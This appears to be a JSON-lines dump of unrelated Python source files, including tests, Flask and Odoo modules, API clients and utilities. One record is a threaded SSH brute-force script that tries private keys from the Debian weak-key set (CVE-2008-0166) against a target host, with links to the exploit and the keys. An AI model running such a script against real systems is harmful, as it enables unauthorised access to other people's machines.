str\",6)\n    assert t.Hello == 6\n    assert t[\"Hello\"] == 6\n    t.declare(\"x\",\"a number\", \"str\")\n    assert len(t) == 2\n    assert t[\"x\"] == \"str\"\n    assert t.x == \"str\"\n    #test the redeclare\n    try:\n        t.declare(\"Hello\",\"new doc\", \"you\")\n        util.fail()\n    except ecto.TendrilRedeclaration, e:\n        print str(e)\n        assert('TendrilRedeclaration' in str(e))\n    try:\n        #read error\n        t.nonexistant = 1\n        util.fail()\n    except ecto.NonExistant, e:\n        print str(e)\n        assert \"tendril_key  nonexistant\" in str(e)\n    try:\n        #index error\n        print t[\"nonexistant\"]\n        util.fail()\n    except ecto.NonExistant, e:\n        print str(e)\n        assert \"tendril_key  nonexistant\" in str(e)\n\n    assert len(t.keys()) == 2\n    assert len(t.values()) == 2\n\n    print t\n    #by value\n    _x = t.x\n    _x = 10\n    assert t.x != 10\n    x = t.x\n    t.x = 11\n    assert x != 11\n    #by reference\n    x = t.at(\"x\")\n    t.x = 13\n    assert x.val == 13\n\n    t.x = 17\n    assert t.x == 17\n    t.x = 199\n    t.x = 15\n    print t.x\n    assert t.x == 15\n\nif __name__ == '__main__':\n    test_tendrils()\n\n"}
{"text": "# SSH brute force with pxssh class and keyfile, based on chapter 2\n# Python 3.4\n\n\"\"\"\n\n Another example of this script: https://www.exploit-db.com/exploits/5720/\n The 32768 keys can be found here: https://github.com/g0tmi1k/debian-ssh\n The exploit CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166\n\n For this works, you must have a Debian distro with an vulnerable version of Openssl.\n I've tested it with version 0.9.8g\n Download links:\n    1 Ubuntu pkg- https://launchpad.net/ubuntu/+source/openssl/0.9.8b-2ubuntu2.1\n    2 Source - https://www.openssl.org/source/old/0.9.x/openssl-0.9.8b.tar.gz\n\n\"\"\"\n\nimport pexpect\nimport argparse\nimport os\nimport threading\n\nmaxConnections = 5\nconnection_lock = threading.BoundedSemaphore(value=maxConnections)\nStop = False\nFails = 0\n\n\ndef connect(user, host, keyfile, release):\n\n    global Stop\n    global Fails\n\n    try:\n\n        # Defines what pexpect should expect as return.\n        perm_denied = 'Permission denied'\n        ssh_newkey = 'Are you sure you want to continue'\n        conn_closed = 'Connection closed by remote host'\n\n        # SSH connection with keyfile instead of password. If no keyfile is sent, there will be no connection.\n        opt = ' -o PasswordAuthentication=no'\n        connStr = 'ssh ' + user + '@' + host + ' -i' + keyfile + opt\n\n        # Starts a connections and reads the return.\n        child = pexpect.spawn(connStr)\n        ret = child.expect([pexpect.TIMEOUT, perm_denied,ssh_newkey, conn_closed, '$', '#'])\n\n\n        if ret == 2:\n            print(\"[-] Adding host to know_host file\")\n            child.sendline('yes')\n            connect(user, host, keyfile, False)\n        elif ret == 3:\n            print(\"[-] {0}.\".format(conn_closed))\n            Fails += 1\n        elif ret > 3:\n            print(\"[+] Success. {0}\".format(str(keyfile)))\n            Stop = True\n\n    finally:\n\n        # After succeed on trying connection, releases the lock from resource.\n        if release:\n            connection_lock.release()\n\ndef main():\n\n    # Defines the options and the help menu.\n    parser = argparse.ArgumentParser(description=\"Simple Python SSH Brute Force with keyfile\")\n    parser.add_argument('Target', help=\"Target host.\")\n    parser.add_argument('User', help=\"User for ssh connection.\")\n    parser.add_argument('KeyDir', help=\"Directory with private keyfiles for connection.\")\n\n    # Receives the arguments sent by the user.\n    args = parser.parse_args()\n    tgtHost = args.Target\n    user = args.User\n    keyDir = args.KeyDir\n\n    # If anything is not set , prints the help menu from argparse and exits.\n    if tgtHost == None or user == None or keyDir == None:\n        print(parser.usage)\n        exit(0)\n\n    for keyfile in os.listdir(keyDir):\n\n        if Stop:\n            print(\"[*] Key found. Exiting.\")\n            exit(0)\n\n        if Fails > 5:\n            print(\"[!] Too many connection errors. Exiting.\")\n            exit(0)\n\n        connection_lock.acquire()\n\n        # Receives the keyfile's location and joins it with the file name for a complete path.\n        fullpath = os.path.join(keyDir, keyfile)\n        print(\"[-] Testing key: {0}\".format(str(fullpath)))\n\n        # Defines and starts the thread.\n        bruteforce = threading.Thread(target=connect, args=(user, host, fullpath, True))\n        child = bruteforce.start()\n\nif __name__ == '__main__':\n    main()"}
{"text": "#coding: utf8\nfrom flask import Blueprint, request\nimport json\nfrom sqlalchemy import select\n\nfrom server import db\n\nfrom .models import VLieuTirSynonymes, PlanChasse, SaisonChasse\nfrom ..utils.utilssqlalchemy import json_resp\n\n\nltroutes = Blueprint('lieux_tir', __name__)\n\n\n@ltroutes.route('/', methods=['GET'])\n@ltroutes.route('/<int:id>', methods=['GET'])\n@json_resp\ndef get_lieutirsyn(id = None):\n    q = db.session.query(VLieuTirSynonymes)\n\n    if request.args.get('code_com') :\n        print 'code_com', request.args.get('code_com')\n        q = q.filter_by(code_com = request.args.get('code_com'))\n\n    if id:\n        q = q.filter_by(id=id)\n\n    data = q.all()\n    return [attribut.as_dict() for attribut in data]\n\n\n@ltroutes.route('/communes', methods=['GET'])\n@json_resp\ndef get_communes():\n    data = db.session \\\n        .query(VLieuTirSynonymes.nom_com, VLieuTirSynonymes.code_com) \\\n        .distinct(VLieuTirSynonymes.nom_com).all()\n    return  [{\"value\" : attribut.nom_com, \"id\" : int(attribut.code_com) } for attribut in data]\n\npcroutes = Blueprint('plan_chasse', __name__)\n\n@pcroutes.route('/bracelet/<int:id>', methods=['GET'])\n@json_resp\ndef get_bracelet_detail(id = None):\n    data = db.session.query(PlanChasse).filter_by(id=id).first()\n    return data.as_dict()\n\n@pcroutes.route('/bracelet/<int:id>', methods=['POST', 'PUT'])\ndef insertupdate_bracelet_detail(id = None):\n    data = json.loads(request.data)\n    o = PlanChasse(**data)\n    db.session.merge(o)\n    try:\n        db.session.commit()\n        return json.dumps({'success':True, 'message':'Enregistrement sauvegard\u00e9 avec success'}), 200, {'ContentType':'application/json'}\n    except Exception as e:\n        db.session.rollback()\n        return json.dumps({'success':False, 'message':'Impossible de sauvegarder l\\'enregistrement'}), 500, {'ContentType':'application/json'}\n\n@pcroutes.route('/auteurs', methods=['GET'])\n@json_resp\ndef get_auteurs():\n\n    s1 = select([PlanChasse.auteur_tir]).distinct()\n    s2 = select([PlanChasse.auteur_constat]).distinct()\n    q = s1.union(s2).alias('auteurs')\n    data = db.session.query(q).all()\n    return [{\"auteur_tir\" : a }for a in data]\n\n@pcroutes.route('/saison', methods=['GET'])\n@json_resp\ndef get_saison_list():\n    data = db.session.query(SaisonChasse).all()\n    return [a.as_dict() for a in data]\n\n@pcroutes.route('/bracelets_list/<int:saison>', methods=['GET'])\n@json_resp\ndef get_bracelet_list(saison = None):\n    data = db.session \\\n        .query(PlanChasse.id, PlanChasse.no_bracelet) \\\n        .filter_by(fk_saison = saison)\\\n        .distinct().all()\n    return  [{\"no_bracelet\" : attribut.no_bracelet, \"id\" : int(attribut.id) } for attribut in data]\n"}
{"text": "\nimport pyvex\n\nfrom .s_errors import SimSlicerError\n\nclass SimSlicer(object):\n    \"\"\"\n    A super lightweight single-IRSB slicing class.\n    \"\"\"\n    def __init__(self, statements, target_tmps=None, target_regs=None, inslice_callback=None, inslice_callback_infodict=None):\n        self._statements = statements\n        self._target_tmps = target_tmps if target_tmps else set()\n        self._target_regs = target_regs if target_regs else set()\n\n        self._inslice_callback = inslice_callback\n\n        # It could be accessed publicly\n        self.inslice_callback_infodict = inslice_callback_infodict\n\n        self.stmts = [ ]\n        self.stmt_indices = [ ]\n        self.final_regs = set()\n\n        if not self._target_tmps and not self._target_regs:\n            raise SimSlicerError('Target temps and/or registers must be specified.')\n\n        self._slice()\n\n    def _slice(self):\n        \"\"\"\n        Slice it!\n        \"\"\"\n\n        regs = set(self._target_regs)\n        tmps = set(self._target_tmps)\n\n        for stmt_idx, stmt in reversed(list(enumerate(self._statements))):\n            if self._backward_handler_stmt(stmt, tmps, regs):\n                self.stmts.insert(0, stmt)\n                self.stmt_indices.insert(0, stmt_idx)\n\n                if self._inslice_callback:\n                    self._inslice_callback(stmt_idx, stmt, self.inslice_callback_infodict)\n\n            if not regs and not tmps:\n                break\n\n        self.final_regs = regs\n\n    #\n    # Backward slice IRStmt handlers\n    #\n\n    def _backward_handler_stmt(self, stmt, temps, regs):\n        funcname = \"_backward_handler_stmt_%s\" % type(stmt).__name__\n\n        in_slice = False\n        if hasattr(self, funcname):\n            in_slice = getattr(self, funcname)(stmt, temps, regs)\n\n        return in_slice\n\n    def _backward_handler_stmt_WrTmp(self, stmt, temps, regs):\n        tmp = stmt.tmp\n\n        if tmp not in temps:\n            return False\n\n        temps.remove(tmp)\n\n        self._backward_handler_expr(stmt.data, temps, regs)\n\n        return True\n\n    def _backward_handler_stmt_Put(self, stmt, temps, regs):\n        reg = stmt.offset\n\n        if reg in regs:\n            regs.remove(reg)\n\n            self._backward_handler_expr(stmt.data, temps, regs)\n\n            return True\n\n        else:\n            return False\n\n    #\n    # Backward slice IRExpr handlers\n    #\n\n    def _backward_handler_expr(self, expr, temps, regs):\n        funcname = \"_backward_handler_expr_%s\" % type(expr).__name__\n        in_slice = False\n        if hasattr(self, funcname):\n            in_slice = getattr(self, funcname)(expr, temps, regs)\n\n        return in_slice\n\n    def _backward_handler_expr_RdTmp(self, expr, temps, regs):\n        tmp = expr.tmp\n\n        temps.add(tmp)\n\n    def _backward_handler_expr_Get(self, expr, temps, regs):\n        reg = expr.offset\n\n        regs.add(reg)\n\n    def _backward_handler_expr_Load(self, expr, temps, regs):\n        addr = expr.addr\n\n        if type(addr) is pyvex.IRExpr.RdTmp:\n            # FIXME: Process other types\n            self._backward_handler_expr(addr, temps, regs)\n\n    def _backward_handler_expr_Unop(self, expr, temps, regs):\n        arg = expr.args[0]\n\n        if type(arg) is pyvex.IRExpr.RdTmp:\n            self._backward_handler_expr(arg, temps, regs)\n\n    def _backward_handler_expr_CCall(self, expr, temps, regs):\n\n        for arg in expr.args:\n            if type(arg) is pyvex.IRExpr.RdTmp:\n                self._backward_handler_expr(arg, temps, regs)\n\n    def _backward_handler_expr_Binop(self, expr, temps, regs):\n\n        for arg in expr.args:\n            if type(arg) is pyvex.IRExpr.RdTmp:\n                self._backward_handler_expr(arg, temps, regs)\n"}
{"text": "\"\"\"Basic tests for nav.arnold\"\"\"\nimport unittest\nfrom nav.arnold import find_input_type\n\nclass TestArnold(unittest.TestCase):\n    \"\"\"Tests for nav.arnold\"\"\"\n\n    def test_find_input_type(self):\n        \"\"\"Test find_input_type\"\"\"\n        ip_address = '158.38.129.113'\n        mac = '5c:f9:dd:78:72:8a'\n        self.assertEqual(find_input_type(ip_address), 'IP')\n        self.assertEqual(find_input_type(mac), 'MAC')\n        self.assertEqual(find_input_type(123), 'SWPORTID')\n\n    def test_typo_not_accepted(self):\n        \"\"\"Tests for weakness in IPy library\"\"\"\n        ip_address = '158.38.129'\n        self.assertEqual(find_input_type(ip_address), 'UNKNOWN')\n\n    def test_end_on_zero(self):\n        \"\"\"Tests that IP-addresses that ends on zero are accepted\"\"\"\n        ip_address = '158.38.129.0'\n        self.assertEqual(find_input_type(ip_address), 'IP')\n\n    def test_ipv6(self):\n        \"\"\"Tests that a simple ipv6 address is recognized\"\"\"\n        ip_address = 'FE80:0000:0000:0000:0202:B3FF:FE1E:8329'\n        self.assertEqual(find_input_type(ip_address), 'IP')\n\n\n"}
{"text": "from dotmailer import Base\nfrom dotmailer.connection import connection\n\n\nclass Survey(Base):\n    \"\"\"\n    \n    \"\"\"\n\n    end_point = '/v2/surveys'\n\n    def __init__(self, **kwargs):\n        self.required_fields = []\n        super(Survey, self).__init__(**kwargs)\n\n\n    @classmethod\n    def get_multiple(cls, assigned_to_address_book_only=True, select=1000,\n                     skip=0):\n\n        if assigned_to_address_book_only:\n            assigned_to_address_book_only = 'true'\n        else:\n            assigned_to_address_book_only = 'false'\n\n        response = connection.get(\n            cls.end_point,\n            query_params={\n                'AssignedToAddressBookOnly': assigned_to_address_book_only,\n                'Select': select,\n                'Skip': skip\n            }\n        )\n        return [cls(**entry) for entry in response]\n\n    @classmethod\n    def get_all(cls, assigned_to_address_book_only=True):\n        \"\"\"\n        Gets a list of all surveys in the account\n        \n        :param assigned_to_address_book_only: A boolean value to \n            indicated if we should only retrieve surveys that have been\n            assigned to an address book.  The default value for this is\n            True\n        \n        :return: \n        \"\"\"\n        select = 1000\n        skip = 0\n        all_surveys = []\n        surveys = cls.get_multiple(assigned_to_address_book_only, select, skip)\n        num_of_entries = len(surveys)\n        while num_of_entries > 0:\n            all_surveys.extend(surveys)\n\n            # If there weren't enough entries then there are no more to\n            # load so simply break out of the loop\n            if num_of_entries < select:\n                break\n\n            skip += select\n            surveys = cls.get_multiple(assigned_to_address_book_only, select,\n                                       skip)\n            num_of_entries = len(surveys)\n        return all_surveys\n\n    @classmethod\n    def get_by_id(cls, id):\n        \"\"\"\n        Get a survey by it's ID value\n        \n        :param id: The DotMailer unique ID value for the survey \n        :return: \n        \"\"\"\n        # Cast the ID parameter to an integer\n        id = int(id)\n\n        # Check that the ID parameter is greater than zero, if not raise\n        # an exception.\n        if id < 1:\n            raise Exception()\n\n        response = connection.get(\n            '{}/{}'.format(cls.end_point, id)\n        )\n        return cls(**response)\n\n    @classmethod\n    def get_survey_fields(cls, id):\n        \"\"\"\n        Gets a list of survey pages, each containing a list of the \n        fields on that page\n        \n        :param id: \n        :return: \n        \"\"\"\n        response = connection.get(\n            '{}/{}/fields'.format(cls.end_point, id)\n        )\n        return response\n"}
{"text": "from __future__ import unicode_literals\nimport functools\nfrom collections import MutableMapping\nfrom datetime import datetime\n\n\ntry:\n    from datetime import timezone\n    utc = timezone.utc\nexcept ImportError:\n    from datetime import timedelta, tzinfo\n    class UTC(tzinfo):\n        def utcoffset(self, dt):\n            return timedelta(0)\n        def tzname(self, dt):\n            return \"UTC\"\n        def dst(self, dst):\n            return timedelta(0)\n    utc = UTC()\n\n\nclass FakeCache(object):\n    \"\"\"\n    An object that mimics just enough of Flask-Cache's API to be compatible\n    with our needs, but does nothing.\n    \"\"\"\n    def get(self, key):\n        return None\n    def set(self, key, value):\n        return None\n    def delete(self, key):\n        return None\n\n\ndef first(iterable, default=None, key=None):\n    \"\"\"\n    Return the first truthy value of an iterable.\n    Shamelessly stolen from https://github.com/hynek/first\n    \"\"\"\n    if key is None:\n        for el in iterable:\n            if el:\n                return el\n    else:\n        for el in iterable:\n            if key(el):\n                return el\n    return default\n\n\nsentinel = object()\n\ndef getattrd(obj, name, default=sentinel):\n    \"\"\"\n    Same as getattr(), but allows dot notation lookup\n    Source: http://stackoverflow.com/a/14324459\n    \"\"\"\n    try:\n        return functools.reduce(getattr, name.split(\".\"), obj)\n    except AttributeError as e:\n        if default is not sentinel:\n            return default\n        raise\n\n\ndef timestamp_from_datetime(dt):\n    \"\"\"\n    Given a datetime, in UTC, return a float that represents the timestamp for\n    that datetime.\n\n    http://stackoverflow.com/questions/8777753/converting-datetime-date-to-utc-timestamp-in-python#8778548\n    \"\"\"\n    dt = dt.replace(tzinfo=utc)\n    if hasattr(dt, \"timestamp\") and callable(dt.timestamp):\n        return dt.replace(tzinfo=utc).timestamp()\n    return (dt - datetime(1970, 1, 1, tzinfo=utc)).total_seconds()\n"}
{"text": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    Delivery Transsmart Ingegration - Address Consolidation\n#    Copyright (C) 2016 1200 Web Development (<http://1200wd.com/>)\n#              (C) 2015 ONESTEiN BV (<http://www.onestein.nl>)\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom openerp import models, fields, api, _\nimport logging\n\n_logger = logging.getLogger(__name__)\n\nclass stock_picking(models.Model):\n    _inherit = 'stock.picking'\n    \n    def _transsmart_document_from_stock_picking(self):\n        \"\"\"Use address consolidation fields for stock picking.\n        \"\"\"\n        document = super(stock_picking, self)._transsmart_document_from_stock_picking()\n        document.update({\n            \"AddressName\": self.partner_id.name or '',\n            \"AddressStreet\": self.shipping_partner_street or '',\n            \"AddressStreet2\": self.shipping_partner_street2 or '',\n            \"AddressStreetNo\": \".\",\n            \"AddressZipcode\": self.shipping_partner_zip or '',\n            \"AddressCity\": self.shipping_partner_city or '',\n            \"AddressState\": self.shipping_partner_state_id.name or '',\n            \"AddressCountry\": self.shipping_partner_country_id.code or '',\n        })\n\n        if self.group_id:\n            related_sale = self.env['sale.order'].search([('procurement_group_id','=',self.group_id.id)])\n            if related_sale:\n                document.update({\n                    \"AddressNameInvoice\": related_sale.partner_invoice_id.name or '',\n                    \"AddressStreetInvoice\": related_sale.invoice_partner_street or '',\n                    \"AddressStreet2Invoice\": related_sale.invoice_partner_street2 or '',\n                    \"AddressStreetNoInvoice\": \"-\",\n                    \"AddressZipcodeInvoice\": related_sale.invoice_partner_zip or '',\n                    \"AddressCityInvoice\": related_sale.invoice_partner_city or '',\n                    \"AddressStateInvoice\": related_sale.shipping_partner_state_id.name or '',\n                    \"AddressCountryInvoice\": related_sale.invoice_partner_country_id.code or '',\n                })\n\n        return document\n"}
{"text": "from multiprocessing import cpu_count\nimport axelrod as axl\nimport pyswarm\nfrom axelrod_dojo.utils import score_player\nfrom axelrod_dojo.utils import PlayerInfo\n\n\nclass PSO(object):\n    \"\"\"PSO class that implements a particle swarm optimization algorithm.\"\"\"\n    def __init__(self, player_class, params_kwargs, objective, opponents=None,\n                 population=1, generations=1, debug=True, phip=0.8, phig=0.8,\n                 omega=0.8, weights=None, sample_count=None, processes=1):\n\n        self.player_class = player_class\n        self.params_kwargs = params_kwargs\n        self.objective = objective\n        if opponents is None:\n            self.opponents_information = [\n                    PlayerInfo(s, {}) for s in axl.short_run_time_strategies]\n        else:\n            self.opponents_information = [\n                    PlayerInfo(p.__class__, p.init_kwargs) for p in opponents]\n        self.population = population\n        self.generations = generations\n        self.debug = debug\n        self.phip = phip\n        self.phig = phig\n        self.omega = omega\n        self.weights = weights\n        self.sample_count = sample_count\n        if processes == 0:\n            self.processes = cpu_count()\n        else:\n            self.processes = processes\n\n    def swarm(self):\n        player = self.player_class(**self.params_kwargs)\n        lb, ub = player.create_vector_bounds()\n\n        def objective_function(vector):\n            player.receive_vector(vector=vector)\n\n            return -score_player(player, objective=self.objective,\n                                 opponents_information=self.opponents_information,\n                                 weights=self.weights,\n                                 sample_count=self.sample_count\n                                 )\n\n        # TODO remove check once v 0.7 is pip installable\n        # There is a multiprocessing version (0.7) of pyswarm available at\n        # https://github.com/tisimst/pyswarm, just pass processes=X\n        # Pip installs version 0.6\n        if pyswarm.__version__ == \"0.7\":\n            xopt, fopt = pyswarm.pso(objective_function, lb, ub,\n                                     swarmsize=self.population,\n                                     maxiter=self.generations, debug=self.debug,\n                                     phip=self.phip, phig=self.phig,\n                                     omega=self.omega, processes=self.processes)\n        else:\n            xopt, fopt = pyswarm.pso(objective_function, lb, ub,\n                                     swarmsize=self.population,\n                                     maxiter=self.generations, debug=self.debug,\n                                     phip=self.phip, phig=self.phig,\n                                     omega=self.omega)\n        return xopt, fopt\n"}
{"text": "# This work was created by participants in the DataONE project, and is\n# jointly copyrighted by participating institutions in DataONE. For\n# more information on DataONE, see our web site at http://dataone.org.\n#\n#   Copyright 2009-2019 DataONE\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Utilities for working with revision / obsolescence chains.\"\"\"\n\nimport d1_common.xml\n\n\ndef get_identifiers(sysmeta_pyxb):\n    \"\"\"Get set of identifiers that provide revision context for SciObj.\n\n    Returns:   tuple: PID, SID, OBSOLETES_PID, OBSOLETED_BY_PID\n\n    \"\"\"\n    pid = d1_common.xml.get_opt_val(sysmeta_pyxb, \"identifier\")\n    sid = d1_common.xml.get_opt_val(sysmeta_pyxb, \"seriesId\")\n    obsoletes_pid = d1_common.xml.get_opt_val(sysmeta_pyxb, \"obsoletes\")\n    obsoleted_by_pid = d1_common.xml.get_opt_val(sysmeta_pyxb, \"obsoletedBy\")\n    return pid, sid, obsoletes_pid, obsoleted_by_pid\n\n\ndef topological_sort(unsorted_dict):\n    \"\"\"Sort objects by dependency.\n\n    Sort a dict of obsoleting PID to obsoleted PID to a list of PIDs in order of\n    obsolescence.\n\n    Args:\n      unsorted_dict : dict\n        Dict that holds obsolescence information. Each ``key/value`` pair establishes\n        that the PID in ``key`` identifies an object that obsoletes an object identifies\n        by the PID in ``value``.\n\n\n    Returns:\n      tuple of sorted_list, unconnected_dict :\n\n      ``sorted_list``: A list of PIDs ordered so that all PIDs that obsolete an object\n      are listed after the object they obsolete.\n\n      ``unconnected_dict``: A dict of PID to obsoleted PID of any objects that could not\n      be added to a revision chain. These items will have obsoletes PIDs that directly\n      or indirectly reference a PID that could not be sorted.\n\n    Notes:\n      ``obsoletes_dict`` is modified by the sort and on return holds any items that\n      could not be sorted.\n\n      The sort works by repeatedly iterating over an unsorted list of PIDs and\n      moving PIDs to the sorted list as they become available. A PID is available to\n      be moved to the sorted list if it does not obsolete a PID or if the PID it\n      obsoletes is already in the sorted list.\n\n    \"\"\"\n    sorted_list = []\n    sorted_set = set()\n    found = True\n    unconnected_dict = unsorted_dict.copy()\n    while found:\n        found = False\n        for pid, obsoletes_pid in list(unconnected_dict.items()):\n            if obsoletes_pid is None or obsoletes_pid in sorted_set:\n                found = True\n                sorted_list.append(pid)\n                sorted_set.add(pid)\n                del unconnected_dict[pid]\n    return sorted_list, unconnected_dict\n\n\ndef get_pids_in_revision_chain(client, did):\n    \"\"\"Args: client: d1_client.cnclient.CoordinatingNodeClient or\n    d1_client.mnclient.MemberNodeClient.\n\n      did : str\n        SID or a PID of any object in a revision chain.\n\n    Returns:\n      list of str:\n        All PIDs in the chain. The returned list is in the same order as the chain. The\n        initial PID is typically obtained by resolving a SID. If the given PID is not in\n        a chain, a list containing the single object is returned.\n\n    \"\"\"\n\n    def _req(p):\n        return d1_common.xml.get_req_val(p)\n\n    def _opt(p, a):\n        return d1_common.xml.get_opt_val(p, a)\n\n    sysmeta_pyxb = client.getSystemMetadata(did)\n    # Walk to tail\n    while _opt(sysmeta_pyxb, \"obsoletes\"):\n        sysmeta_pyxb = client.getSystemMetadata(_opt(sysmeta_pyxb, \"obsoletes\"))\n    chain_pid_list = [_req(sysmeta_pyxb.identifier)]\n    # Walk from tail to head, recording traversed PIDs\n    while _opt(sysmeta_pyxb, \"obsoletedBy\"):\n        sysmeta_pyxb = client.getSystemMetadata(_opt(sysmeta_pyxb, \"obsoletedBy\"))\n        chain_pid_list.append(_req(sysmeta_pyxb.identifier))\n    return chain_pid_list\n\n\ndef revision_list_to_obsoletes_dict(revision_list):\n    \"\"\"Args: revision_list: list of tuple tuple: PID, SID, OBSOLETES_PID,\n    OBSOLETED_BY_PID.\n\n    Returns:   dict: Dict of obsoleted PID to obsoleting PID.\n\n    \"\"\"\n    return {\n        pid: obsoletes_pid\n        for pid, sid, obsoletes_pid, obsoleted_by_pid in revision_list\n    }\n\n\ndef revision_list_to_obsoleted_by_dict(revision_list):\n    \"\"\"Args: revision_list: list of tuple tuple: PID, SID, OBSOLETES_PID,\n    OBSOLETED_BY_PID.\n\n    Returns:   dict: Dict of obsoleting PID to obsoleted PID.\n\n    \"\"\"\n    return {\n        pid: obsoleted_by_pid\n        for pid, sid, obsoletes_pid, obsoleted_by_pid in revision_list\n    }\n"}
{"text": "#-*- coding: utf-8 -*-\n#\n# Copyright (C) 2005, TUBITAK/UEKAE\n#\n# This program is free software; you can redistribute it and/or modify it under\n# the terms of the GNU General Public License as published by the Free\n# Software Foundation; either version 3 of the License, or (at your option)\n# any later version.\n#\n# Please read the COPYING file.\n#\n# Author: S. Caglar Onur\n\n# Standard Python Modules\nimport re\nimport sys\nfrom itertools import izip\nfrom itertools import imap\nfrom itertools import count\nfrom itertools import ifilter\nfrom itertools import ifilterfalse\n\n# ActionsAPI\nimport pisi.actionsapi\n\ndef cat(filename):\n    return file(filename).xreadlines()\n\nclass grep:\n    '''keep only lines that match the regexp'''\n    def __init__(self, pat, flags = 0):\n        self.fun = re.compile(pat, flags).match\n    def __ror__(self, input):\n        return ifilter(self.fun, input)\n\nclass tr:\n    '''apply arbitrary transform to each sequence element'''\n    def __init__(self, transform):\n        self.tr = transform\n    def __ror__(self, input):\n        return imap(self.tr, input)\n\nclass printto:\n    '''print sequence elements one per line'''\n    def __init__(self, out = sys.stdout):\n        self.out = out\n    def __ror__(self,input):\n        for line in input:\n            print >> self.out, line\n\nprintlines = printto(sys.stdout)\n\nclass terminator:\n    def __init__(self,method):\n        self.process = method\n    def __ror__(self,input):\n        return self.process(input)\n\naslist = terminator(list)\nasdict = terminator(dict)\nastuple = terminator(tuple)\njoin = terminator(''.join)\nenum = terminator(enumerate)\n\nclass sort:\n    def __ror__(self,input):\n        ll = list(input)\n        ll.sort()\n        return ll\nsort = sort()\n\nclass uniq:\n    def __ror__(self,input):\n        for i in input:\n            try:\n                if i == prev:\n                    continue\n            except NameError:\n                pass            \n            prev = i\n            yield i\nuniq = uniq()\n"}
{"text": "import requests\nfrom talent_curator import app\nGOOGLE_DRIVE_API_URI = 'https://www.googleapis.com/drive/v2/files/'\n\nlogger = app.logger\nHEADERS = {\n    'Authorization': \"Bearer {access_token}\",\n    'Content-type': \"application/json\",\n}\n\n\nclass GoogleDriveAPI(object):\n    def get_document(self, access_token, document_id):\n        headers = self.build_headers(access_token=access_token)\n\n        r = requests.get(GOOGLE_DRIVE_API_URI + document_id, headers=headers)\n        file_resource = None\n        if r.status_code == requests.codes.ok:\n            file_resource = r.json\n            logger.debug(\"File found: %s\", file_resource)\n        else:\n            logger.error(\"Failed to find document: %s\", r.reason)\n            logger.error(\"Full response %s\", r.text)\n        return file_resource\n\n    def search(self, access_token, query):\n        headers = self.build_headers(access_token=access_token)\n        query_string = {'q': query}\n        r = requests.get(GOOGLE_DRIVE_API_URI, headers=headers, params=query_string)\n        if r.status_code != requests.codes.ok:\n            return None\n\n        logger.debug(\"Response %s\" % r.text)\n        results_list = r.json['items']\n        return results_list\n\n    def children(self, access_token, folder_id):\n        headers = self.build_headers(access_token=access_token)\n        r = requests.get(GOOGLE_DRIVE_API_URI + folder_id + '/children', headers=headers, params={'maxResults': 5})\n        logger.debug(\"Response %s\" % r.json['items'])\n        if r.status_code != requests.codes.ok:\n            return None\n        return r.json['items']\n\n    def build_headers(self, *args, **kwargs):\n        headers = {}\n        for key, val in HEADERS.iteritems():\n            headers[key] = val.format(**kwargs)\n        return headers\n"}
{"text": "babel = None\ntry:\n    import babel\nexcept ImportError:\n    pass\nimport six\nfrom sqlalchemy import types\n\nfrom sqlalchemy_utils import ImproperlyConfigured\nfrom sqlalchemy_utils.primitives import Currency\n\nfrom .scalar_coercible import ScalarCoercible\n\n\nclass CurrencyType(types.TypeDecorator, ScalarCoercible):\n    \"\"\"\n    Changes :class:`.Currency` objects to a string representation on the way in\n    and changes them back to :class:`.Currency` objects on the way out.\n\n    In order to use CurrencyType you need to install Babel_ first.\n\n    .. _Babel: http://babel.pocoo.org/\n\n    ::\n\n\n        from sqlalchemy_utils import CurrencyType, Currency\n\n\n        class User(Base):\n            __tablename__ = 'user'\n            id = sa.Column(sa.Integer, autoincrement=True)\n            name = sa.Column(sa.Unicode(255))\n            currency = sa.Column(CurrencyType)\n\n\n        user = User()\n        user.currency = Currency('USD')\n        session.add(user)\n        session.commit()\n\n        user.currency  # Currency('USD')\n        user.currency.name  # US Dollar\n\n        str(user.currency)  # US Dollar\n        user.currency.symbol  # $\n\n\n\n    CurrencyType is scalar coercible::\n\n\n        user.currency = 'US'\n        user.currency  # Currency('US')\n    \"\"\"\n    impl = types.String(3)\n    python_type = Currency\n\n    def __init__(self, *args, **kwargs):\n        if babel is None:\n            raise ImproperlyConfigured(\n                \"'babel' package is required in order to use CurrencyType.\"\n            )\n\n        super(CurrencyType, self).__init__(*args, **kwargs)\n\n    def process_bind_param(self, value, dialect):\n        if isinstance(value, Currency):\n            return value.code\n        elif isinstance(value, six.string_types):\n            return value\n\n    def process_result_value(self, value, dialect):\n        if value is not None:\n            return Currency(value)\n\n    def _coerce(self, value):\n        if value is not None and not isinstance(value, Currency):\n            return Currency(value)\n        return value\n"}
